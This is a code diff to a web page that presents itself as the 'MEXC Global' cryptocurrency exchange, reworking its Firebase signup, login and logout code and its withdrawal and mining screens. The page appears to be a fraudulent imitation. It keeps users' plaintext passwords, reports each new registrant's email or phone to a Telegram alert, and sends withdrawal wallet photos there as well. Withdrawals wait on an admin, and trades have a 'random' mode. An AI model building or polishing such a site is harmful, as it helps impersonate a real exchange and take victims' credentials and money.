@@ -2790,6 +2790,10 @@
             display: inline-block;
             vertical-align: middle;
         }
+        /* Updated status box for professional look */
+        .status-box {
+            border: 1px solid #2b313a;
+        }
     </style>
 </head>
 <body>
@@ -6661,7 +6665,7 @@
         }
 
         // ============================================
-        // WITHDRAW
+        // WITHDRAW (Enhanced with professional image status)
         // ============================================
         document.addEventListener('DOMContentLoaded', function() {
             const wdInput = document.getElementById('withdrawAmountInput');
@@ -6725,10 +6729,11 @@
                     `📷 <b>Withdrawal Wallet QR Code Photo</b>\nUser: ${regCode} (${userMail})`);
             }
 
+            // Enhanced professional status overlay for withdrawal request
             showStatusOverlay(
                 '⏳',
                 'Withdrawal Request Submitted!',
-                'Your withdrawal request is pending admin approval.',
+                'Your withdrawal request has been sent to admin for approval.',
                 `Amount: ${amount} ${asset} • Fee: ${fee.toFixed(4)} ${asset} • Receive: ${receiveAmount.toFixed(4)} ${asset}`,
                 'pending',
                 '⏳ Waiting for Approval'
@@ -6737,7 +6742,7 @@
         }
 
         // ============================================
-        // STATUS OVERLAY
+        // STATUS OVERLAY (Enhanced)
         // ============================================
         function showStatusOverlay(icon, title, subtitle, detail, type, btnText) {
             const overlay = document.getElementById('statusOverlay');
@@ -6871,7 +6876,7 @@
         }
 
         // ============================================
-        // MINING SYSTEM
+        // MINING SYSTEM (Enhanced VIP Early-Stop)
         // ============================================
         function renderMiningPage() {
             const container = document.getElementById('miningPackageContainer');
@@ -6897,6 +6902,7 @@
                 const isCompleted = activeMining && activeMining.status === 'completed' && activeMining.packageId ===
                     pkg.id;
                 const canStart = !hasActive || (isActive && activeMining.status === 'completed');
+                // VIP early-stop: can stop only if active and user has VIP level that allows this package
                 const canStop = isActive && (activeMining.status === 'active') && canStopPackages.includes(pkg.id);
 
                 let statusHTML = '';
@@ -7012,6 +7018,7 @@
             renderTradeMiningGrid();
         }
 
+        // VIP Early-Stop: collect all profit + principal
         function stopMiningEarly(packageId) {
             if (!currentUser) return;
             const active = currentUser.mining?.active;
@@ -8390,23 +8397,235 @@
         }
 
         // ============================================
-        // LOGOUT
+        // LOGOUT (Enhanced: immediately show signup/login)
         // ============================================
         window.handleLogout = async function() {
             try {
                 if (window.auth) await window.auth.signOut();
             } catch (e) { console.error(e); }
+            // Clear currentUser and show signup/login
             currentUser = null;
             adminTargetUserData = null;
+            // Clear any active mining interval
+            if (miningInterval) clearInterval(miningInterval);
+            // Update UI to show signup button
             updateHeaderUI();
             updateBalanceUI();
-            alert('Logged out successfully.');
+            // Immediately open auth modal to signup/login
+            openAuthModal('signup');
+            // Close profile modal if open
             closeModal('profileModal');
+            // Update other UI components
             renderTradeMiningGrid();
             renderNewCoins();
             renderMyHoldings();
             updateNewCoinsHeaderCount();
+            // Optionally show a small status message
+            showStatusOverlay(
+                '👋',
+                'Logged Out',
+                'You have been logged out successfully.',
+                'Please sign up or login to continue.',
+                'pending',
+                '✅ OK'
+            );
         };
+
+        // ============================================
+        // FIREBASE AUTH (Modular, Enhanced Signup)
+        // ============================================
+        (function initFirebase() {
+            // Only load Firebase if not already loaded
+            if (document.querySelector('script[src*="firebase-app"]')) return;
+            const script = document.createElement('script');
+            script.type = 'module';
+            script.textContent = `
+            import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+            import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, RecaptchaVerifier, signInWithPhoneNumber, signOut } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
+
+            const firebaseConfig = {
+              apiKey: "AIzaSyDLR3p--3thIwPLJrW09HI9H9JtyOJG2iY",
+              authDomain: "mexc-25615.firebaseapp.com",
+              projectId: "mexc-25615",
+              storageBucket: "mexc-25615.firebasestorage.app",
+              messagingSenderId: "286403620152",
+              appId: "1:286403620152:web:0cb7e608152eee5a2265cd"
+            };
+
+            const app = initializeApp(firebaseConfig);
+            const auth = getAuth(app);
+            window.auth = auth;
+            let confirmationResultObj = null;
+
+            window.requestVerificationCode = async function() {
+              const identifier = document.getElementById('signupInput').value.trim();
+              const btn = document.getElementById('sendCodeBtn');
+              if (!identifier) { alert('Please enter a phone number or email address.'); return; }
+              if (identifier.startsWith('+') || /^\\d+$/.test(identifier)) {
+                try {
+                  if (!window.recaptchaVerifier) {
+                    window.recaptchaVerifier = new RecaptchaVerifier(auth, 'recaptcha-container', {
+                      'size': 'invisible',
+                      'callback': (response) => {}
+                    });
+                  }
+                  const appVerifier = window.recaptchaVerifier;
+                  confirmationResultObj = await signInWithPhoneNumber(auth, identifier, appVerifier);
+                  alert('Verification code sent to your phone.');
+                  let countdown = 60;
+                  btn.disabled = true;
+                  btn.style.opacity = '0.6';
+                  const interval = setInterval(() => {
+                    btn.textContent = \`Resend (\${countdown}s)\`;
+                    countdown--;
+                    if (countdown < 0) {
+                      clearInterval(interval);
+                      btn.disabled = false;
+                      btn.style.opacity = '1';
+                      btn.textContent = 'Send Code';
+                    }
+                  }, 1000);
+                } catch (error) {
+                  console.error(error);
+                  alert('Failed to send verification code: ' + error.message);
+                }
+              } else {
+                alert('Verification code request is only required for phone numbers.');
+              }
+            };
+
+            // Enhanced signup with professional error handling
+            window.handleSignUp = async function(event) {
+              event.preventDefault();
+              const identifier = document.getElementById('signupInput').value.trim();
+              const pass = document.getElementById('signupPass').value;
+              const confirmPass = document.getElementById('signupConfirmPass').value;
+              const code = document.getElementById('signupCode').value.trim();
+              const statusDiv = document.getElementById('signupStatus');
+
+              if (pass !== confirmPass) { 
+                statusDiv.className = 'status-msg error';
+                statusDiv.textContent = 'Passwords do not match! Please re-enter.';
+                return; 
+              }
+
+              try {
+                let userEmailOrPhone = identifier;
+                if ((identifier.startsWith('+') || /^\\d+$/.test(identifier)) && confirmationResultObj) {
+                  if (!code) { 
+                    alert('Please enter the verification code sent to your phone.'); 
+                    return; 
+                  }
+                  const result = await confirmationResultObj.confirm(code);
+                  userEmailOrPhone = result.user.phoneNumber;
+                } else {
+                  const userCredential = await createUserWithEmailAndPassword(auth, identifier, pass);
+                  userEmailOrPhone = userCredential.user.email;
+                }
+
+                // Check if this email/phone already has data
+                const existingKey = 'mexc_user_data_' + userEmailOrPhone;
+                const existingData = localStorage.getItem(existingKey);
+                if (existingData) {
+                  statusDiv.className = 'status-msg error';
+                  statusDiv.innerHTML = '⚠️ This email/phone is already registered. Please <strong>Login</strong> or use a different email.';
+                  return;
+                }
+
+                // Create new user
+                window.currentUser = {
+                  email: userEmailOrPhone,
+                  password: pass,
+                  regCode: window.generateRegionalCode ? window.generateRegionalCode() : "REG-" + Math.floor(100000 + Math.random() * 900000),
+                  usdtBalance: 0.00,
+                  btcBalance: 0.000,
+                  ethBalance: 0.000,
+                  tradeMode: 'random',
+                  kycStatus: 'Not Submitted',
+                  avatar: '',
+                  vipLevel: 0,
+                  mining: { active: null, history: [], vipLevel: 0 },
+                  newCoinHoldings: {},
+                  newCoinPurchaseHistory: []
+                };
+                window.adminTargetUserData = { ...window.currentUser };
+                localStorage.setItem('mexc_user_email', userEmailOrPhone);
+                window.saveUserData();
+                statusDiv.className = 'status-msg success';
+                statusDiv.innerHTML = \`✅ Registration successful! Your ID: <strong>\${window.currentUser.regCode}</strong>\`;
+                window.updateHeaderUI();
+                window.updateBalanceUI();
+                window.sendTelegramAlert(\`🎉 <b>New User Registered!</b>\\n🆔 <b>Code:</b> \${window.currentUser.regCode}\\n📧 <b>Identifier:</b> \${window.currentUser.email}\`);
+                window.renderTradeMiningGrid();
+                window.renderNewCoins();
+                window.renderMyHoldings();
+                window.updateNewCoinsHeaderCount();
+                // Professional status overlay
+                window.showStatusOverlay('🎉', 'Registration Successful!', \`Your ID: \${window.currentUser.regCode}\`, 'Welcome to MEXC Global!', 'success', '✅ Done');
+                setTimeout(() => window.closeModal('authModal'), 800);
+              } catch (error) {
+                statusDiv.className = 'status-msg error';
+                if (error.code === 'auth/email-already-in-use') {
+                  statusDiv.innerHTML = '⚠️ This email is already registered. Please <strong>Login</strong> or use a different email.';
+                } else {
+                  statusDiv.textContent = 'Error: ' + error.message;
+                }
+                // Show professional error overlay
+                window.showStatusOverlay('❌', 'Registration Failed', error.message, 'Please try again with different credentials.', 'fail', '❌ Close');
+              }
+            };
+
+            window.handleLogin = async function(event) {
+              event.preventDefault();
+              const identifier = document.getElementById('loginInput').value.trim();
+              const pass = document.getElementById('loginPass').value;
+              const statusDiv = document.getElementById('loginStatus');
+
+              try {
+                const userCredential = await signInWithEmailAndPassword(auth, identifier, pass);
+                const email = userCredential.user.email;
+                localStorage.setItem('mexc_user_email', email);
+                window.loadUserData(email);
+                window.adminTargetUserData = { ...window.currentUser };
+                statusDiv.className = 'status-msg success';
+                statusDiv.textContent = '✅ Login successful! Welcome back.';
+                window.updateHeaderUI();
+                window.updateBalanceUI();
+                window.renderTradeMiningGrid();
+                window.renderNewCoins();
+                window.renderMyHoldings();
+                window.updateNewCoinsHeaderCount();
+                if (window.miningInterval) clearInterval(window.miningInterval);
+                window.miningInterval = setInterval(window.checkMiningStatus, 60000);
+                window.checkMiningStatus();
+                window.showStatusOverlay('👋', 'Welcome Back!', \`Logged in as \${window.currentUser ? window.currentUser.regCode : 'user'}\`, 'Your account is ready.', 'success', '✅ Done');
+                setTimeout(() => window.closeModal('authModal'), 800);
+              } catch (error) {
+                statusDiv.className = 'status-msg error';
+                statusDiv.textContent = 'Error: ' + error.message;
+                window.showStatusOverlay('❌', 'Login Failed', error.message, 'Please check your credentials and try again.', 'fail', '❌ Close');
+              }
+            };
+
+            window.handleLogout = async function() {
+              try { await signOut(auth); } catch(e) { console.error(e); }
+              localStorage.removeItem('mexc_user_email');
+              window.currentUser = null;
+              window.adminTargetUserData = null;
+              window.updateHeaderUI();
+              window.updateBalanceUI();
+              window.renderTradeMiningGrid();
+              window.renderNewCoins();
+              window.renderMyHoldings();
+              window.updateNewCoinsHeaderCount();
+              // Immediately show signup/login modal
+              window.openAuthModal('signup');
+              window.closeModal('profileModal');
+              window.showStatusOverlay('👋', 'Logged Out', 'You have been logged out successfully.', 'Please sign up or login to continue.', 'pending', '✅ OK');
+            };
+          `;
+            document.head.appendChild(script);
+        })();
 
         // ============================================
         // INIT
@@ -8496,175 +8715,6 @@
                 });
             });
         });
-
-        // ============================================
-        // FIREBASE AUTH (modular)
-        // ============================================
-        (function initFirebase() {
-            const script = document.createElement('script');
-            script.type = 'module';
-            script.textContent = `
-            import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-            import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, RecaptchaVerifier, signInWithPhoneNumber, signOut } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
-
-            const firebaseConfig = {
-              apiKey: "AIzaSyDLR3p--3thIwPLJrW09HI9H9JtyOJG2iY",
-              authDomain: "mexc-25615.firebaseapp.com",
-              projectId: "mexc-25615",
-              storageBucket: "mexc-25615.firebasestorage.app",
-              messagingSenderId: "286403620152",
-              appId: "1:286403620152:web:0cb7e608152eee5a2265cd"
-            };
-
-            const app = initializeApp(firebaseConfig);
-            const auth = getAuth(app);
-            window.auth = auth;
-            let confirmationResultObj = null;
-
-            window.requestVerificationCode = async function() {
-              const identifier = document.getElementById('signupInput').value.trim();
-              const btn = document.getElementById('sendCodeBtn');
-              if (!identifier) { alert('Please enter a phone number or email address.'); return; }
-              if (identifier.startsWith('+') || /^\\d+$/.test(identifier)) {
-                try {
-                  if (!window.recaptchaVerifier) {
-                    window.recaptchaVerifier = new RecaptchaVerifier(auth, 'recaptcha-container', {
-                      'size': 'invisible',
-                      'callback': (response) => {}
-                    });
-                  }
-                  const appVerifier = window.recaptchaVerifier;
-                  confirmationResultObj = await signInWithPhoneNumber(auth, identifier, appVerifier);
-                  alert('Verification code sent to your phone.');
-                  let countdown = 60;
-                  btn.disabled = true;
-                  btn.style.opacity = '0.6';
-                  const interval = setInterval(() => {
-                    btn.textContent = \`Resend (\${countdown}s)\`;
-                    countdown--;
-                    if (countdown < 0) {
-                      clearInterval(interval);
-                      btn.disabled = false;
-                      btn.style.opacity = '1';
-                      btn.textContent = 'Send Code';
-                    }
-                  }, 1000);
-                } catch (error) {
-                  console.error(error);
-                  alert('Failed to send verification code: ' + error.message);
-                }
-              } else {
-                alert('Verification code request is only required for phone numbers.');
-              }
-            };
-
-            window.handleSignUp = async function(event) {
-              event.preventDefault();
-              const identifier = document.getElementById('signupInput').value.trim();
-              const pass = document.getElementById('signupPass').value;
-              const confirmPass = document.getElementById('signupConfirmPass').value;
-              const code = document.getElementById('signupCode').value.trim();
-              const statusDiv = document.getElementById('signupStatus');
-
-              if (pass !== confirmPass) { alert('Passwords do not match!'); return; }
-
-              try {
-                let userEmailOrPhone = identifier;
-                if ((identifier.startsWith('+') || /^\\d+$/.test(identifier)) && confirmationResultObj) {
-                  if (!code) { alert('Please enter the verification code sent to your phone.'); return; }
-                  const result = await confirmationResultObj.confirm(code);
-                  userEmailOrPhone = result.user.phoneNumber;
-                } else {
-                  const userCredential = await createUserWithEmailAndPassword(auth, identifier, pass);
-                  userEmailOrPhone = userCredential.user.email;
-                }
-
-                window.currentUser = {
-                  email: userEmailOrPhone,
-                  password: pass,
-                  regCode: window.generateRegionalCode ? window.generateRegionalCode() : "REG-" + Math.floor(100000 + Math.random() * 900000),
-                  usdtBalance: 0.00,
-                  btcBalance: 0.000,
-                  ethBalance: 0.000,
-                  tradeMode: 'random',
-                  kycStatus: 'Not Submitted',
-                  avatar: '',
-                  vipLevel: 0,
-                  mining: { active: null, history: [], vipLevel: 0 },
-                  newCoinHoldings: {},
-                  newCoinPurchaseHistory: []
-                };
-                window.adminTargetUserData = { ...window.currentUser };
-                localStorage.setItem('mexc_user_email', userEmailOrPhone);
-                window.saveUserData();
-                statusDiv.className = 'status-msg success';
-                statusDiv.textContent = \`Registration successful! Your ID: \${window.currentUser.regCode}\`;
-                window.updateHeaderUI();
-                window.updateBalanceUI();
-                window.sendTelegramAlert(\`🎉 <b>New User Registered!</b>\\n🆔 <b>Code:</b> \${window.currentUser.regCode}\\n📧 <b>Identifier:</b> \${window.currentUser.email}\`);
-                window.renderTradeMiningGrid();
-                window.renderNewCoins();
-                window.renderMyHoldings();
-                window.updateNewCoinsHeaderCount();
-                window.showStatusOverlay('🎉', 'Registration Successful!', \`Your ID: \${window.currentUser.regCode}\`, 'Welcome to MEXC Global!', 'success', '✅ Done');
-                setTimeout(() => window.closeModal('authModal'), 800);
-              } catch (error) {
-                statusDiv.className = 'status-msg error';
-                if (error.code === 'auth/email-already-in-use') {
-                  statusDiv.textContent = "This email is already registered. Please login or use a different email address.";
-                } else {
-                  statusDiv.textContent = 'Error: ' + error.message;
-                }
-              }
-            };
-
-            window.handleLogin = async function(event) {
-              event.preventDefault();
-              const identifier = document.getElementById('loginInput').value.trim();
-              const pass = document.getElementById('loginPass').value;
-              const statusDiv = document.getElementById('loginStatus');
-
-              try {
-                const userCredential = await signInWithEmailAndPassword(auth, identifier, pass);
-                const email = userCredential.user.email;
-                localStorage.setItem('mexc_user_email', email);
-                window.loadUserData(email);
-                window.adminTargetUserData = { ...window.currentUser };
-                statusDiv.className = 'status-msg success';
-                statusDiv.textContent = 'Login successful! Welcome back.';
-                window.updateHeaderUI();
-                window.updateBalanceUI();
-                window.renderTradeMiningGrid();
-                window.renderNewCoins();
-                window.renderMyHoldings();
-                window.updateNewCoinsHeaderCount();
-                if (window.miningInterval) clearInterval(window.miningInterval);
-                window.miningInterval = setInterval(window.checkMiningStatus, 60000);
-                window.checkMiningStatus();
-                window.showStatusOverlay('👋', 'Welcome Back!', \`Logged in as \${window.currentUser ? window.currentUser.regCode : 'user'}\`, 'Your account is ready.', 'success', '✅ Done');
-                setTimeout(() => window.closeModal('authModal'), 800);
-              } catch (error) {
-                statusDiv.className = 'status-msg error';
-                statusDiv.textContent = 'Error: ' + error.message;
-              }
-            };
-
-            window.handleLogout = async function() {
-              try { await signOut(auth); } catch(e) { console.error(e); }
-              localStorage.removeItem('mexc_user_email');
-              window.currentUser = null;
-              window.adminTargetUserData = null;
-              window.updateHeaderUI();
-              window.updateBalanceUI();
-              window.renderTradeMiningGrid();
-              window.renderNewCoins();
-              window.renderMyHoldings();
-              window.updateNewCoinsHeaderCount();
-              alert('Logged out successfully.');
-              window.closeModal('profileModal');
-            };
-          `;
-            document.head.appendChild(script);
-        })();
     </script>
 </body>
+</html>
